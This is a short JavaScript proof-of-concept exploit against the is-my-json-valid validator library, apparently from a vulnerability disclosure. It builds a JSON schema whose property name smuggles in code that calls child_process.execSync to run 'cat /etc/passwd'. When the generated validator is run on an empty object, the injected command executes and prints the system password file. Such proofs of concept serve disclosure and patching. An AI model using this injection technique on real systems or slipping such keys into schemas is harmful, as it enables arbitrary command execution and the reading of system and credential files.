const validator = require('is-my-json-valid')
const schema = {
    type: 'object',
    properties: {
          'x[console.log(process.mainModule.require(`child_process`).execSync(`cat /etc/passwd`).toString(`utf-8`))]': {
                  required: true,
                  type:'string'
                }
        },
}
var validate = validator(schema);
validate({})
